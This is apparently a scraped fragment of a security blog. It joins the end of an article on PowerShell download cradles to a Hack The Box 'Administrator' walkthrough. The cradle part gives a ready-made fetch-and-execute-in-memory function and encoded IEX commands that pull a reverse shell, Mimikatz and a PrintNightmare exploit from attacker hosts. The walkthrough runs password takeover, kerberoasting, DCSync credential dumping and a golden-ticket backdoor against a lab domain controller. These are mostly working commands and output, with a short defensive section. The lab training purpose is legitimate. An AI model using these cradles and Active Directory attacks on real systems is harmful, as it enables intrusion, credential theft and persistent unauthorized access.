((nslookup -querytype=txt \u0026#34;example.com\u0026#34; | Select -Pattern \u0026#39;\u0026#34;*\u0026#34;\u0026#39;) -split \u0026#39;\u0026#34;\u0026#39;[0]) ))) # XML Document Method $a = New-Object System.Xml.XmlDocument $a.Load(\u0026#34;https://example.com/command.xml\u0026#34;) $a.command.a.execute | iex Creating a Secure Download Cradle: Basic Setup Launch PowerShell with appropriate privileges Configure execution policy if needed Set-ExecutionPolicy RemoteSigned Secure Download Cradle Code: Here\u0026rsquo;s a complete, production-ready download cradle implementation that incorporates logging, error handling, and security controls:\nfunction Invoke-SecureDownloadCradle { # Enable advanced function features like -Verbose [CmdletBinding()] param ( # Required URL parameter for the script to download [Parameter(Mandatory=$true)] [string]$Url, # Optional custom User-Agent to avoid detection or meet requirements [Parameter(Mandatory=$false)] [string]$UserAgent = \u0026#34;PowerShell/SecurityAudit\u0026#34;, # Optional timeout in milliseconds (default 30 seconds) [Parameter(Mandatory=$false)] [int]$Timeout = 30000, # Optional switch to enable Windows Event Log logging [Parameter(Mandatory=$false)] [switch]$EnableLogging ) # Internal logging function to handle both event logs and verbose output function Write-Log { param($Message) if ($EnableLogging) { $logParams = @{ LogName = \u0026#39;Application\u0026#39; # Write to Windows Application log Source = \u0026#39;SecureDownloadCradle\u0026#39; EventId = 1000 EntryType = \u0026#39;Information\u0026#39; Message = $Message } try { Write-EventLog @logParams } catch { Write-Warning \u0026#34;Logging failed: $_\u0026#34; } } Write-Verbose $Message # Always write to verbose stream } try { Write-Log \u0026#34;Starting download from: $Url\u0026#34; # Force TLS 1.2 for security and reset cert callback to default [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12 [System.Net.ServicePointManager]::ServerCertificateValidationCallback = $null # Initialize WebClient with security settings $webClient = New-Object System.Net.WebClient $webClient.Headers.Add(\u0026#34;User-Agent\u0026#34;, $UserAgent) # Configure system proxy settings automatically $webClient.Proxy = [System.Net.WebRequest]::GetSystemWebProxy() $webClient.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials Write-Log \u0026#34;Downloading content...\u0026#34; $scriptContent = $webClient.DownloadString($Url) Write-Log \u0026#34;Content downloaded successfully\u0026#34; # Execute the downloaded content safely using InvokeCommand Write-Log \u0026#34;Executing script in memory\u0026#34; $ExecutionContext.InvokeCommand.InvokeScript($false, [scriptblock]::Create($scriptContent), $null, $null) Write-Log \u0026#34;Execution completed successfully\u0026#34; } catch [System.Net.WebException] { # Handle network-specific errors separately $errorMsg = \u0026#34;Network error occurred: $($_.Exception.Message)\u0026#34; Write-Log $errorMsg throw $errorMsg } catch { # Handle all other errors $errorMsg = \u0026#34;Unexpected error occurred: $_\u0026#34; Write-Log $errorMsg throw $errorMsg } finally { # Ensure proper cleanup of resources if ($webClient) { $webClient.Dispose() Write-Log \u0026#34;WebClient disposed\u0026#34; } } } This implementation includes:\nComprehensive error handling Event logging (when enabled - requires admin privileges as requires REG change) TLS 1.2 enforcement Proper proxy handling Certificate validation Resource cleanup Verbose output support Example usage without logging: #Import Script . .\\Invoke-SecureDownloadCradle.ps1 #Run Invoke-SecureDownloadCradle -Url \u0026#34;http://[IP]/[SCRIPT].ps1\u0026#34; -Verbose Example usage with logging: #Import Script . .\\Invoke-SecureDownloadCradle.ps1 # Create Event Source New-EventLog -LogName Application -Source \u0026#34;SecureDownloadCradle\u0026#34; #Run Invoke-SecureDownloadCradle -Url \u0026#34;http://[IP]/[SCRIPT].ps1\u0026#34; -Verbose # Read the logs Get-WinEvent -LogName Application | Where-Object {$_.ProviderName -eq \u0026#34;SecureDownloadCradle\u0026#34;} +Notes+: A custom user agent can also be passed:\n-UserAgent \u0026quot;CompanyName/UpdateService\u0026quot; Real-World Examples Of Download-Cradle Use In HackTheBox: I will often use download cradles on hack the box and here are some recent examples: Jab: Using a download cradle via impacket-dcomexec to get a reverse shell: Create the powershell cradle file:\necho \u0026#39;IEX (New-Object Net.Webclient).downloadstring(\u0026#34;http://[ip]/rev.ps1\u0026#34;)\u0026#39; \u0026gt;\u0026gt; cradle This will be used to grab the hosted shell from our system. Encode the powershell cradle in correct UTF format so powershell can understand it.\ncat cradle | iconv -t UTF-16LE | base64 -w 0; echo Breakdown: cat cradle: Reads the contents of the file (which is the PowerShell command). iconv -t UTF-16LE: Converts the plain text into UTF-16 Little Endian encoding. PowerShell\u0026rsquo;s -EncodedCommand parameter expects the input to be in UTF-16LE format because that\u0026rsquo;s how Windows internally represents strings. base64 -w 0: Base64-encodes the UTF-16LE data. -w 0 ensures the output is all on one line (no line breaks), which is required for PowerShell to interpret it correctly. echo: Just adds a newline at the end so you don\u0026rsquo;t get a messy prompt afterward. +Note+: I would always base64 encode cradles as often special characters such as parenthesis etc will need escaping to function correctly. Prepare our shell, I like to use nishang however you can use http://revshells.com etc.\nCopy our shell\ncp ~/Dropbox/40-49_Career/45-KaliShared/45.01-WindowsTools/nishang/Shells/Invoke-PowerShellTcpOneLine.ps1 rev.ps1 Modify IP/Port in shell if required.\nvi rev.ps1 Start our webserver:\nsudo python -m http.server 80 Start our listener:\nrlwrap -cAr nc -nvlp 53 Paste the base64 encoded command into powershell/injection point\nimpacket-dcomexec -object MMC20 -silentcommand -debug $domain/$user:$pass@$box \u0026#39;powershell.exe -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMwAxAC8AcgBlAHYALgBwAHMAMQAiACkACgA=\u0026#39; Monteverde Box: Extracting the Administrator Password for Azure: +Full Walkthrough+: https://bloodstiller.com/walkthroughs/monteverde-box/ In this example, we used a download cradle to execute AdConnect exploitation directly in memory:\niex(new-object net.webclient).downloadstring(\u0026#39;http://10.10.14.46:9000/AdConnectPOC.ps1\u0026#39;) As the exploit is run in memory we get the administrators password without writing to disk. Certified Box: Advanced Mimikatz Usage to perform a DC-Sync Attack: +Full Walkthrough+: https://bloodstiller.com/walkthroughs/certified-box/ Coming soon (it\u0026rsquo;s still in release arena. ) Note this is not a spoiler as this is done post exploitation. Setting Up the Environment Start a Python HTTP server to host the Mimikatz script: python3 -m http.server 9000 Loading Mimikatz into Memory Using a download cradle to load invoke-mimikatz directly into memory:\niex(new-object net.webclient).downloadstring(\u0026#39;http://10.10.14.24:9000/Invoke-Mimikatz.ps1\u0026#39;) +Note+: This will hang for a little bit, so just be patient. Performing DC-Sync Attack Now that mimikatz is loaded into memory we can use it like we normally would and pass it arguments. Invoke-Mimikatz -Command \u0026#39;\u0026#34;privilege::debug\u0026#34; \u0026#34;lsadump::dcsync /user:krbtgt /domain:administrator.htb\u0026#34;\u0026#39; Driver Box: Running PrintNightmare POC from a download cradle: +Full Walkthrough+: https://bloodstiller.com/walkthroughs/driver-box/ Coming soon (it\u0026rsquo;s still in release arena. )\nStart python server to host the script:\npython3 -m http.server 9000 +Note+: I have this command aliased to pws Use the download cradle to load the POC directly into memory:\niex(new-object net.webclient).downloadstring(\u0026#39;http://10.10.14.97:9000/CVE-2021-1675.ps1\u0026#39;) Execute the script from memory to create new user \u0026amp; add them to the admins:\nInvoke-Nightmare -NewUser \u0026#34;bloodstiller\u0026#34; -NewPassword \u0026#34;bl00dst1ll3r!\u0026#34; -DriverName \u0026#34;PrintIt\u0026#34; Verify the user has been added:\nnet user bloodstiller Security Considerations: Detection Methods Modern security solutions detect download cradles through several means: PowerShell logging and ScriptBlock logging Network traffic analysis (especially .DownloadString patterns) AMSI integration in PowerShell 5.0+ EDR behavioral analysis Memory scanning for known patterns Common Restrictions Organizations often implement: # Execution Policy Set-ExecutionPolicy Restricted # AMSI Scanning # Built into PowerShell 5.0+ by default # AppLocker Rules # Block PowerShell download cradle patterns New-AppLockerPolicy -RuleType Path -Deny -Path \u0026#34;%SYSTEM32%\\WindowsPowerShell\\*\\powershell.exe\u0026#34; -User Everyone Defensive Recommendations For system administrators:\nEnable PowerShell logging:\n# Enable detailed script block logging Set-ItemProperty -Path \u0026#34;HKLM:\\SOFTWARE\\Wow6432Node\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging\u0026#34; -Name \u0026#34;EnableScriptBlockLogging\u0026#34; -Value 1 Monitor for suspicious patterns:\nDirect execution using IEX Base64 encoded commands Uncommon COM objects Unusual DNS TXT queries Network Controls:\nImplement HTTPS inspection Block outbound PowerShell connections Monitor for unusual PowerShell network activity ",

        "content": "Administrator Hack The Box Walkthrough/Writeup: https://app.hackthebox.com/machines/Administrator How I use variables \u0026amp; Wordlists: Variables:\nIn my commands you are going to see me use $box, $user, $hash, $domain, $pass often. I find the easiest way to eliminate type-os \u0026amp; to streamline my process it is easier to store important information in variables \u0026amp; aliases. $box = The IP of the box $pass = Passwords I have access to. $user = current user I am enumerating with. Depending on where I am in the process this can change if I move laterally. $domain = the domain name e.g. sugarape.local or contoso.local $machine = the machine name e.g. DC01 Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information. Wordlists:\nI have symlinks all setup so I can get to my passwords from ~/Wordlists so if you see me using that path that\u0026rsquo;s why. If you are on Kali and following on, you will need to go to /usr/share/wordlists I also use these additional wordlists: Statistically-likely-usernames SecLists Auto_Wordlists 1. Enumeration: Assumed Breach Box: This box scenario assumes that the Active Directory (AD) environment has already been breached and that we have access to valid credentials. This approach reflects a more realistic model, given that direct breaches of AD environments from external footholds are increasingly rare today. +Note+: Even with assumed credentials, I\u0026rsquo;ll still conduct my standard enumeration process as if I don\u0026rsquo;t have them. This ensures I don\u0026rsquo;t overlook any findings just because access is available. Comprehensive documentation of all discoveries remains essential. NMAP: Basic Scans: Basic TCP Scan: nmap $box -Pn -oA TCPbasicScan kali in HTB/BlogEntriesMade/Administrator/scans/nmap 🍣 main 1GiB/7GiB | 0B/1GiB with /usr/bin/zsh 🕙 07:31:11 zsh ❯ nmap $box -Pn -oA TCPbasicScan Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-10 07:31 GMT Nmap scan report for 10.129.160.121 Host is up (0.038s latency). Not shown: 988 closed tcp ports (reset) PORT STATE SERVICE 21/tcp open ftp 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl Nmap done: 1 IP address (1 host up) scanned in 3.65 seconds Initial thoughts: FTP DNS SMB RPC LDAP Kerberos Comprehensive Scans: In depth scan TCP:\nsudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP kali in HTB/BlogEntriesMade/Administrator/scans/nmap 🍣 main 1GiB/7GiB | 0B/1GiB with /usr/bin/zsh 🕙 07:32:32 zsh ✖ sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP [sudo] password for kali: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-10 07:33 GMT Nmap scan report for 10.129.160.121 Host is up (0.037s latency). Not shown: 65509 closed tcp ports (reset) PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-syst: |_ SYST: Windows_NT 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-11-10 14:34:09Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 9389/tcp open mc-nmf .NET Message Framing 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49668/tcp open msrpc Microsoft Windows RPC 51257/tcp open msrpc Microsoft Windows RPC 57547/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 57552/tcp open msrpc Microsoft Windows RPC 57563/tcp open msrpc Microsoft Windows RPC 57574/tcp open msrpc Microsoft Windows RPC 57607/tcp open msrpc Microsoft Windows RPC No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.94SVN%E=4%D=11/10%OT=21%CT=1%CU=31464%PV=Y%DS=2%DC=I%G=Y%TM=673 OS:0623B%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10C%TI=I%CI=I%II=I%SS=S OS:%TS=A)OPS(O1=M53CNW8ST11%O2=M53CNW8ST11%O3=M53CNW8NNT11%O4=M53CNW8ST11%O OS:5=M53CNW8ST11%O6=M53CST11)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6 OS:=FFDC)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M53CNW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O OS:%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD= OS:0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0% OS:S=A%A=O%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G OS:%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z) Network Distance: 2 hops Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: 7h00m01s | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required | smb2-time: | date: 2024-11-10T14:35:18 |_ start_date: N/A OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . LDAP 389: Using LDAP anonymous bind to enumerate further: If you are unsure of what anonymous bind does. It enables us to query for domain information anonymously, e.g. without passing credentials.\nWe can actually retrieve a significant amount of information via anonymous bind such as: A list of all users A list of all groups A list of all computers. User account attributes. The domain password policy. Enumerate users who are susceptible to AS-REPRoasting. Passwords stored in the description fields The added benefit of using ldap to perform these queries is that these are most likely not going to trigger any sort of AV etc as ldap is how AD communicates. I actually have a handy script to check if anonymous bind is enabled \u0026amp; if it is to dump a large amount of information. You can find it here\nhttps://github.com/bloodstiller/ldapire https://bloodstiller.com/cheatsheets/ldap-cheatsheet/#ldap-boxes-on-htb python3 /home/kali/windowsTools/enumeration/ldapire.py $box It will dump general information \u0026amp; also detailed \u0026amp; simple information including: Groups Users It turns out the anonymous bind is not enabled and we get the below information. I have removed the majority of the information as it is not relevant, however there are some keys bits of information we can use moving forward.\nWe have the naming context of the domain:\n🕙 07:33:20 zsh ❯ python3 /home/kali/windowsTools/enumeration/ldapire.py $box Attempting to connect to 10.129.160.121 with SSL... Failed to connect with SSL. Attempting to connect to 10.129.160.121 with non-SSL... Connected successfully using anonymous bind. Retrieving server information... DSA info (from DSE): Supported LDAP versions: 3, 2 Naming contexts: DC=administrator,DC=htb CN=Configuration,DC=administrator,DC=htb CN=Schema,CN=Configuration,DC=administrator,DC=htb DC=DomainDnsZones,DC=administrator,DC=htb DC=ForestDnsZones,DC=administrator,DC=htb We have the domain functionality level:\nOther: domainFunctionality: 7 forestFunctionality: 7 domainControllerFunctionality: 7 rootDomainNamingContext: DC=administrator,DC=htb The functionality level determines the minimum version of Windows server that can be used for a DC. +Note+: that any host os can be used on workstations, however the functionality level determines what the minimum version for DC\u0026rsquo;s and the forest.\nhttps://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels Knowing the function level is useful as if want to target the DC\u0026rsquo;s and servers, we can know by looking at the function level what the minimum level of OS would be.\nIn this case we can see it is level 7 which means that this server has to be running Windows Server 2016 or newer.\nHere\u0026rsquo;s a list of functional level numbers and their corresponding Windows Server operating systems:\nFunctional Level Number Corresponding OS 0 Windows 2000 1 Windows Server 2003 Interim 2 Windows Server 2003 3 Windows Server 2008 4 Windows Server 2008 R2 5 Windows Server 2012 6 Windows Server 2012 R2 7 Windows Server 2016 8 Windows Server 2019 9 Windows Server 2022 +Note+: Each number corresponds to the minimum Windows Server version required for domain controllers in the domain or forest. As the functional level increases, additional Active Directory features become available, but older versions of Windows Server may not be supported as domain controllers. We have the full server name: Again we can see this has the CN as the base (mentioned previously.) serverName: CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=administrator,DC=htb It\u0026rsquo;s pretty amazing already what we have learned just by running some fairly simple ldap queries.\nWe have the naming context. Domain name. Updating ETC/HOSTS \u0026amp; Variables: Updated Domain \u0026amp; Machine Variables for Testing:\nNow that I have this information, I can update the domain and machine variables used in tests: update_var domain \u0026quot;administrator.htb\u0026quot; update_var machine \u0026quot;DC\u0026quot; Updating /etc/hosts for DNS and LDAP Queries:\nI update my /etc/hosts file to enable tools like kerbrute for user enumeration and other tools that require DNS or LDAP for queries: echo \u0026quot;$box $domain $machine.$domain\u0026quot; | sudo tee -a /etc/hosts Syncing Clocks for Kerberos Exploitation: Since Kerberos is enabled on this host, it\u0026rsquo;s best practice to sync our clock with the host\u0026rsquo;s. This helps avoid issues from clock misalignment, which can cause false negatives in Kerberos exploitation attempts. sudo ntpdate -s $domain +Note+: I am doing this now as we have the DNS name etc. DNS 53: Using dnsenum to enumerate DNS entries: dnsenum -r --dnsserver $box --enum -p 0 -s 0 -f ~/Wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt $domain Nothing of note. +Note+: The timestamps for this will be strange (if you look at those) due to having an issue with DNS for a while. It suddenly resolve. Kerberos 88: Using netexec for Kerberoasting: As we have creds we can kerberoast: netexec ldap $box -u $user -p $pass --kerberoast kerb.txt None Using netexec for ASReproasting: We should always try and asreproast with a null/guest session as it can lead to an easy win: netexec ldap $box -u $user -p $pass --asreproast asrep.txt Nothing: RPC: As we have valid credentials we can also connect to RPC to enumerate further: rpcclient -U $user $box Enumerating domain users via RPC: Enumerating users using rpc: enumdomusers I add all these users to my users list. Querying inidividual users: queryuser [RID] I query each user in the event that there is anything useful in the description field but there isn\u0026rsquo;t. FTP 21: I connect to FTP and try \u0026amp; authenticate as Olivia but she does not have access:\nftp $box I also check as anonymous but no luck:\nSMB 445: Attempting to connect with NULL \u0026amp; Guest sessions: This is a standard check I always try as alot of the time the guest account or null sessions can lead to a foothold: netexec smb $box -u 'guest' -p '' --shares netexec smb $box -u '' -p '' --shares Both NULL \u0026amp; Guest sessions have been disabled. Attempting to connect as Olivia: I connect as Olivia and she has access to IPC$, NETLOGON \u0026amp; SYSVOL, SYSVOL can be interesting as sometimes it can contain shares: netexec smb $box -u $user -p $pass --shares Using smbclient: I connect to SYSVOL: smbclient -U 'guest' \u0026quot;\\\\\\\\$box\\\\SYSVOL\u0026quot; Nothing immediately jumps out lets table this. 2. Lateral Movement: Running a BloodHound Collection: As we have credentials we can run bloodhound collection bloodhound-python -dc $machine.$domain -c All -u $user -p $pass -d $domain -ns $box Discovering an attack chain for lateral movement in bloodhound: Looking at our bloodhound results we can see that Olivia has GenericAll rights over Michael which allows alot of potentially attack paths for us:\nWe can perform a Targeted Kerberoasting Attack, Force Change their Password or a Shadow Credentials attack (these are just a few options.) We just need to look at the edge in bloodhound: Michael in turn has the ForceChangePassword privilege over Benjamin:\nThis means if we can control Michael we can then change Benjamin\u0026rsquo;s password Benjamin is a member of the Share Moderators group:\nSo far I am unsure of what specifically this will grant us just yet but it seems like something interesting to go after. Performing a targeted kerberoasting attack on Michael: I perform am going to perform a targeted kerberoast attack on michael from olivia\u0026rsquo;s account. This way we can extract a hash for cracking.\nClone the repo:\ngit clone https://github.com/ShutdownRepo/targetedKerberoast.git Perform our attack:\npython3 targetedKerberoast.py -v -d $domain -u $user -p $pass --request-user michael -o michael.kerb Attempting to crack Michael\u0026rsquo;s password with hashcat: Now we have Michael\u0026rsquo;s kerberos ticket lets attempt to crack it with hashcat to export his clear text password: hashcat -m 13100 michael.kerb /home/kali/Wordlists/rockyou.txt -O It does not crack. Attempting to add Michael Directly to the Share Operators group: As we have GenericAll over Michael we should be able to give him group access: (this is incorrect see my notes) net rpc group addmem \u0026quot;share moderators\u0026quot; \u0026quot;michael\u0026quot; -U $domain/$user%$pass -S $box +Note+: This is not possible as we do not have write privileges over the group. For some reason I was convinced at the time this was a viable approach. Changing Michaels Password: Our options at the start were to perform a targeted kerberoasting attack, which we performed but could not extract the hash. The other option is a shadow credentials attack however we cannot perform this as there is no CA \u0026amp; so now we move onto changing Michaels password. Changing a user\u0026rsquo;s password is typically a last resort in an engagement, as it can disrupt the user\u0026rsquo;s work and may fall outside the approved scope. This is why I left this until last\nLets set the our new password\nnewPass=bl00dst1ll3r! net rpc password \u0026quot;Michael\u0026quot; $newPass -U $domain/$user%$pass -S $box +Note+: There is no output from this so we need to verify it worked Verify it works:\nnetexec smb $box -u $user -p $newPass --shares Enumerating as Michael: I check FTP access:\nStill no access. We can login via evil-winrm:\nI will come back to this as I want to proceed with the benjamin password change. +Note+: The user flag is not on the users desktop. I discover there are 3 users with access to the host:\nThis is useful as if we extract more creds later this can help direct our attack. Changing Benjamins Password: We repeat the process we did before for Michael but for Benjamin.\nSet our password\nnet rpc password \u0026quot;Benjamin\u0026quot; $newPass -U $domain/$user%$newPass -S $box +Note+: There is no output from this so we need to verify it worked Verify it works:\nnetexec smb $box -u benjamin -p $newPass --shares Benjamin does not have win-rm access:\nAccessing FTP as Benjamin: I check if benjamin has access to ftp \u0026amp; he does\nBenjamin has access to FTP:\nFinding a password safe file in the FTP: There is a file called Backup.psafe3\nI download the file to my local attach machine:\nThere is an error as we are downloading in ascii mode, if we switch to binary mode we should be able to remove this warning. I switch to binary mode \u0026amp; re-download to be sure:\nLooking online we discover the format psafe3 is used by the password manager \u0026ldquo;Password Safe\u0026rdquo;:\nhttps://www.pwsafe.org/ Cracking the pwsafe File with John: John the ripper has a module for pwsafe files pwsafe2john I run this to extract the hash:\npwsafe2john Backup.psafe3 \u0026gt; pwsafehash Crack with john:\njohn pwsafehash --wordlist=/home/kali/Wordlists/rockyou.txt Retrieving passwords from the pswafe file: So we can open this we need to install password safe:\n# get release wget https://github.com/pwsafe/pwsafe/releases/download/1.20.0/passwordsafe-debian12-1.20-amd64.deb # make exectuable chmod +x passwordsafe-debian12-1.20-amd64.deb #install sudo apt install ~/Downloads/passwordsafe-debian12-1.20-amd64.deb Load up the file Backup.psafe3:\nI entered the cracked password too. When it opens we see the following entries:\nI click \u0026ldquo;Edit Entry\u0026rdquo; on each entry to expand it and see notes:\nI do this as sometimes additional information will be stored here which can be useful but there is nothing in this case. I retrieve all 3 users passwords:\nAlexander, Emily \u0026amp; Emma. I am especially interested in Emily as she is another user on the host. 3. Privilege Escalation: Accessing the host as emily: As we saw earlier that emily has access to the host connect using her credentials:\nevil-winrm -i $box -u $user -p $pass Grab the user flag:\nDiscovering Emily has GenericWrite privileges over Ethan in bloodhound: Emily has GenericWrite over Ethan:\nLooking in bloodhound we can see emily has GenericWrite over Ethan Ethan has DC-Sync Rights over the root domain object:\nThis means if we can control ethan we can then perform a DC-Sync attack and extract all creds. Performing a targeted kerberoasting attack on Ethan: Looking at the GenericWrite edge in bloodhound we can see that a targeted kerberoasting attack is a viable option:\nPerform our attack:\nAs we already have targetedKerberoast downloaded from earlier we can use that. python3 targetedKerberoast.py -v -d $domain -u $user -p $pass --request-user ethan -o ethan.kerb We succesfully perform the attack Cracking the Ethan\u0026rsquo;s Kerberos hash with hashcat: Cracking ethans kerberos has with hashcat:\nhashcat -m 13100 ethan.kerb /home/kali/Wordlists/rockyou.txt -O It cracks We Verify his creds work:\nnetexec smb $box -u $user -p $pass --shares Performing a DCSync Attack with impacket-secretsdump: As ethan has DC-Sync privileges we can perform a DC-Sync attack now.\nPerforming the DC-Sync attack as Ethan:\nimpacket-secretsdump $domain/$user:$pass@$box Getting our root flag via evil-winrm and PTH:\n4. Persistence: Trying to create a Kerberos Golden Ticket: Using impacket-lookupsid to get the Search for the Domain SID:\nimpacket-lookupsid $domain/$user@$machine.$domain -domain-sids Sync our clock to the host using ntupdate:\nsudo ntpdate -s $domain Using impacket-ticketer to create the Golden Ticket:\nimpacket-ticketer -nthash $krbtgt -domain-sid $sid -domain $domain Administrator Export the ticket to the KRB5CCNAME Variable:\nexport KRB5CCNAME=./administrator.ccache Use the ticket for connecting via psexec\nimpacket-psexec -k -no-pass $machine.$domain +Note+: This error occurs because protections are in place that prevent ticket creation using NT hashes or RC4 encryption. Instead, we need to create a Golden Ticket using the AES hash of the KRBTGT account. Using a download Cradle to load invoke-mimikatz into memory: Initially I tried to generate a ticket just using the KRBTGT NT hash however this was revoked (expected) however we can get around this by extracting the AESKEY using mimikatz and extracting a creating a ticket\nTo avoid AMSI I decide to use invoke-mimikatz this means I can use a download cradle to load the script directly into memory without needing to download anything onto the host itself.\n+Deep Dive+: I have a deep dive into download cradles and how they work:\nhttps://bloodstiller.com/articles/understandingdownloadcradles/ I stand up my python server:\npython3 -m http.server 9000 +Note+: I have the above command aliased to pws for ease on my machine. On the target from an evil-winrm admin shell I use a download cradle to load the sript into memory: iex(new-object net.webclient).downloadstring('http://10.10.14.24:9000/Invoke-Mimikatz.ps1') +Note+: This will hang for a little bit, so just be patient. Using invoke-mimikatz to perform a targeted DC-Sync attack to extract the KRBTGT AES hash: Lets perform a DC-SYNC attack targeting the krbtgt user and extract their aes hash: Invoke-Mimikatz -Command '\u0026quot;privilege::debug\u0026quot; \u0026quot;lsadump::dcsync /user:krbtgt /domain:administrator.htb\u0026quot;' +Note+: We already have the this AES hash from secretsdump but I wanted to demo how it can extracted using invoke-mimikatz/mimikatz \u0026amp; a download cradle. Creating our golden-ticket using impacket-ticketer: We can now create our ticket:\nimpacket-ticketer -aesKey $aesKey -domain-sid $sid -domain $domain administrator Load into memory:\nexport KRB5CCNAME=./administrator.ccache Connecting via PSEXEC with our golden-ticket: Access the host: impacket-psexec -k -no-pass $machine.$domain Why create a golden ticket? \u0026ldquo;But bloodstiller why are you making a golden ticket if you have the admin hash?\u0026rdquo; Glad you asked: Creating a Golden Ticket during an engagement is a reliable way to maintain access over the long haul. Here\u0026rsquo;s why: KRBTGT Hash Dependence: Golden Tickets are generated using the KRBTGT account hash from the target\u0026rsquo;s domain controller. Unlike user account passwords, KRBTGT hashes are rarely rotated (and in many organizations, they are never changed), so the Golden Ticket remains valid indefinitely. KRBTGT Hash—The Key to It All (for upto 10 years): A Golden Ticket can allow you to maintain access to a system for up to 10 years (yeah, you read that right the default lifespan of a golden ticket is 10 years) without needing additional credentials. This makes it a reliable backdoor, especially if re-access is needed long after initial entry. Think about it: even if they reset every user\u0026rsquo;s password (including the administrator etc) your Golden Ticket is still valid because it\u0026rsquo;s tied to the KRBTGT account, not individual users. 5. Beyond Root: There is an alternative way to own Ethan after we have control Emily.\nAs we have GenericWrite over Ethan we can set the DONT_REQ_PREAUTH flag (setting to be to true) on his account to enable us to perform an AS-REP roasting attack on his account to retrieve a hash to crack.\nThis attack can be with powerview or the inbuilt Active Directory PowerShell Module, I will show you with both.\nFirst lets verify that the DONT_REQ_PREAUTH flag is not already set on any accounts by using the AD PowerShell module:\nGet-DomainUser -PreauthNotRequired As we can see it is not. Using AD PowerShell Module to set DONT_REQ_PREAUTH flag on Ethan\u0026rsquo;s account: This module is already built in and enabled on this host so this is the easiest way. Using Active Directory PowerShell Module: Get-ADUser Ethan | Set-ADAccountControl -DoesNotRequirePreAuth $true Verify it worked: Get-DomainUser -PreauthNotRequired Using PowerView to set DONT_REQ_PREAUTH flag on Ethan\u0026rsquo;s account: Transfer PowerView via evil-winrm:\nImport powerview:\n. .\\PowerView.ps1 Set the Pre-Auth to be true PowerView:\nSet-DomainObject -Identity ethan -Set @{'userAccountControl' = 4194304} +Note+: Setting userAccountControl to 4194304 disables Pre-Authentication (equivalent to DoesNotRequirePreAuth). Verify it worked:\nGet-DomainUser -UACFilter DONT_REQ_PREAUTH As we can see it worked. AS-REP roasting Ethan using Impacket-GetNPUsers: impacket-GetNPUsers $domain/ethan -dc-ip $box -no-pass -format hashcat -outputfile asrep.txt +Note+: For some reason it threw some errors, despite having the time set \u0026amp; also did not save the hash to a file, so I have to save to a file manually. Cracking Ethans AS-REP Hash Using Hashcat: This will still gives us the same password etc as we have seen before it\u0026rsquo;s just a different method for doing so. hashcat -m 18200 AS-REP.txt ~/Wordlists/rockyou.txt Lessons Learned: What did I learn? I learned that no matter how much I try and convince myself it\u0026rsquo;s true unless I have write properties on an object I do not. I learned about cracking password safe files, I have never done that before so it was good to do. What silly mistakes did I make? See note 1 above. Standard, reset box and didn\u0026rsquo;t update my /etc/hosts and was like \u0026ldquo;wow that is strange behaviour it must be intended, until I realised I was just stupid\u0026rdquo; Sign off: Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!\nUntil next time, hack the planet!\n– Bloodstiller\n– Get in touch bloodstiller at proton dot me\n",
